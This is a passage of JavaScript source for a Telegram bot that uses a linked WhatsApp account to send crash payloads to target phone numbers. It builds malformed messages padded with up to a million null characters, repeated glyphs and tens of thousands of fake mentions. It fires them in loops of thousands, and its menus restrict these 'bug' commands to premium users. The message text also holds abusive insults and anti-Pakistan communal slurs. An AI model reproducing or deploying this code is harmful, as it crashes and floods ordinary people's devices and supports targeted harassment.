                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "꧔꧈".repeat(102000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}
const Qcrl = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    interactiveMessage: {
      body: { 
        title: "", 
        text: "\u0000".repeat(1000000),
        footer: "",
        description: ""
      },
      carouselMessage: {
        cards: []
      },
      contextInfo: {
        mentionedJid: ["status@broadcast"]
      }
    }
  }
};
async function VampUrlCrash(target, Ptcp = true) {
    let pesan = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "Vampire.Firebase" + "\u0000".repeat(1000000) },
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            name: "galaxy_message",
                            title: "null",
                            header: "I'm The King Of Vampire",
                            body: "👀"
                        }),
                        buttons: []
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    }, { quoted: Qcrl });

    await vamp.relayMessage(target, pesan.message, Ptcp ? { participant: { jid: target, messageId: pesan.key.id } } : {});
    console.log(chalk.blue(" success send bug "))
}
async function VampDelayMess(target, Ptcp = true) {
      await vamp.relayMessage(tatget, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐜𝐨𝐦",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐜𝐨𝐦\n" + "@15056662003".repeat(17000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: 'Iqbhalkeifer', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐯𝐬 𝐄𝐯𝐞𝐫𝐲𝐛𝐨𝐝𝐲",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, Ptcp ? {
        participant: {
          jid: target
        }
      } : {});
    }
async function VampireBugIns(groupJid) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝚅𝚊𝚖𝚙𝚒𝚛𝚎" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [
                    {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                    },
                    {
                        name: "galaxy_message",
                        paramsJson: {
                            "screen_2_OptIn_0": true,
                            "screen_2_OptIn_1": true,
                            "screen_1_Dropdown_0": "nullOnTop",
                            "screen_1_DatePicker_1": "1028995200000",
                            "screen_1_TextInput_2": "null@gmail.com",
                            "screen_1_TextInput_3": "94643116",
                            "screen_0_TextInput_0": "\u0000".repeat(500000),
                            "screen_0_TextInput_1": "SecretDocu",
                            "screen_0_Dropdown_2": "#926-Xnull",
                            "screen_0_RadioButtonsGroup_3": "0_true",
                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                        },
                    },
                ],
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: groupJid,
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await sock.relayMessage(groupJid, message, {}); // Hapus userJid untuk grup
        console.log(`Success sending bug to group: ${groupJid}`);
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "AGYA TERA BAAP PAKISTAN KI MAA KI CHUT Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "I AM INDIAN JAI SHREE RAM Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "🇮🇳JAY SHREE RAM" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function VampireIOS(target) {
for (let i = 0; i < 10; i++) {
await VampireCrashiPhone(target);
await VampireiPhone(target);
await VampireInvisIphone(target);
await VampireBlankIphone(target);
}
};
async function VampOri(target) {
    for (let i = 0; i <= 100; i++) {
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    }

}
async function VampDelayInvis(target) {
    for (let i = 0; i <= 8000; i++) {
    await VampBroadcast(target, mention = true)
    await VampBroadcast(target, mention = true)
    await VampBroadcast(target, mention = true)
    await VampBroadcast(target, mention = true)
    await VampBroadcast(target, mention = true)
    await VampBroadcast(target, mention = true)
    }

}
async function VampBeta(target) {
    for (let i = 0; i <= 8000; i++) {
    await VampDeviceCrash(target, Ptcp = true)
    await VampDeviceCrash(target, Ptcp = true)
    await VampDeviceCrash(target, Ptcp = true)
    await VampDeviceCrash(target, Ptcp = true)
    await VampDeviceCrash(target, Ptcp = true)
    await VampDeviceCrash(target, Ptcp = true)
    await VampDeviceCrash(target, Ptcp = true)
    await VampDeviceCrash(target, Ptcp = true)
    }

}
async function VampCrashChat(target) {
    for (let i = 0; i <= 100; i++) {
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    }

}
async function VampCrashUi(target) {
    for (let i = 0; i <= 100; i++) {
    await VampireSpamNotif(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    await VampireSpamNotif(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    await VampireSpamNotif(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    await VampireSpamNotif(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    }

}
async function VampiPhone(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireIOS(target);
    }

}
async function VampChannel(target) {
    for (let i = 0; i <= 5; i++) {
    await VampCrashCH(target)
    await VampCrashCH2(target)
    }

}
async function VampGroup(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireBugIns(groupJid)
    }

}
async function callbug(target) {
  for (let i = 0; i <= 5; i++) {
    await spamcall(target);
    await sleep(3000)
  }
}
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;

  // Ambil tanggal sekarang
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;

  let ligma = `
𖤊───⪩  𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @MOTU_PATALU_HINDU_HAI
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯JAY SHREE RAM🙏 🚩🚩TU HINDU HAI 🏴‍☠️
╭──────────────────────╮
│        「     𝐏𝐫𝐞𝐬𝐬 𝐁𝐮𝐭𝐭𝐨𝐧 𝐌𝐞𝐧𝐮    」
╰──────────────────────╯
`;

  bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
                      callback_data: "bugmenu"
                  },
                  {
                      text: "〢𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮",
                      callback_data: "ownermenu"
                  }
              ],
              [
                  {
                      text: "〢𝐓𝐨𝐨𝐥𝐬",
                      callback_data: "toolsmenu"
                  }
              ],
              [
                  {
                      text: "〢𝐂𝐡𝐚𝐧𝐧𝐞𝐥",
                      url: "https://t.me/MOTU_PATALU_HINDU_HAI"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/bugmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
𖤊───⪩  𝙈𝙊𝙏𝙐 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @MOTU_PATALU_HINDU_HAI
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯
╭────── 「   𝐁𝐮𝐠 𝐌𝐞𝐧𝐮   」 ──────╮
│➥ /vampori 91×××
│➥ /vampbeta 91×××
│➥ /vampbussines 91×××
│➥ /vampios 91×××
│➥ /delayinvis 91×××
│➥ /vampui 91×××
╰──────────────────────╯
╭───「  𝐁𝐮𝐠 𝐆𝐫𝐨𝐮𝐩 & 𝐂𝐡𝐚𝐧𝐧𝐞𝐥  」───╮
│➢ /vampgroup <Link>
│➢ /vampch <Newsletter>
╰──────────────────────╯
`;
  bot.sendvideo(chatId, "https://files.catbox.moe/byppx7.mp4", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                      url: "https://t.me/MOTU_PATALU_HINDU_HAI"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/ownermenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
𖤊───⪩  𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @MOTU_PATALU_HINDU_HAI
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯
╭──────「 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 」──────╮
│➵ /addbot <Num>
│➵ /addprem <ID>
│➵ /delprem <ID>
│➵ /addowner <ID>
│➵ /delowner <ID>
╰──────────────────────╯
`;
  bot.sendVideo(chatId, "https://files.catbox.moe/oa1xbd.mp4", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "༽𝗢𝘄𝗻𝗲𝗿༼",
                      url: "https://t.me/MOTU_PATALU_HINDU_HAI"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/toolsmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
𖤊───⪩  𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @MOTU_PATALU_HINDU_HAI
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯
╭──────「 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 」───────╮
│➩ /fixedbug <Num>
│➩ /encrypthard <Tag File>
│➩ /cooldown <Num>
╰──────────────────────╯
`;
  bot.sendVideo(chatId, "https://files.catbox.moe/oa1xbd.mp4", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                      url: "https://t.me/MOTU_PATALU_HINDU_HAI"
                  }
              ]
          ]
      }
  });
});
//========================================================\\ 
bot.onText(/\/addbot(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "❌Lu Bukan Owner Tolol!!!")
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Pakai Code Negara Bego\nContoh Nih Njing: /addbot 91×××.");
}
const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(chatId, "❌ Contoh Nih Njing : /addbot 91×××.");
}

await getSessions(bot, chatId, numberTarget)
});

bot.onText(/^\/fixedbug\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
    
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }
    
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Motu patlu!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});
bot.onText(/\/cooldown (\d+)m/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Pastikan hanya owner yang bisa mengatur cooldown
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "Lu Siapa Ngentot...\nGak ada hak gunain fitur ini");
  }

  // Pastikan match[1] ada dan valid
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❌ Masukkan waktu cooldown yang valid dalam format angka diikuti 'm'. Contoh: /cooldown 10m");
  }

  const newCooldown = parseInt(match[1], 10);
  if (isNaN(newCooldown) || newCooldown <= 0) {
    return bot.sendMessage(chatId, "❌ Masukkan waktu cooldown yang valid dalam menit.");
  }

  cooldownTime = newCooldown * 60; // Ubah ke detik
  return bot.sendMessage(chatId, `✅ Cooldown time successfully set to ${newCooldown} menit.`);
});
bot.onText(/\/vampori(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /vampori 91×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampori 91×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim pesan awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/asx3vo.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
        await VampOri(formatedNumber);
    }

    // Kirim pesan setelah selesai dengan gambar lain
    await bot.sendVideo(chatId, "https://files.catbox.moe/wulifj.mp4", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampori
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampbeta(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampbeta 91×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampbeta 91×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    await bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
        await VampBeta(formatedNumber);
        await VampCrashChat(formatedNumber);
    }

    await bot.sendVideo(chatId, "https://files.catbox.moe/wulifj.mp4", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampbeta
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampbussines(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampbeta 91×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampbeta 91×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/dd347m.png", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
        await VampCrashUi(formatedNumber);
        await VampDelayInvis(formatedNumber);
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendVideo(chatId, "https://files.catbox.moe/wulifj.mp4", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampbeta
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampios(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampbeta 91×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
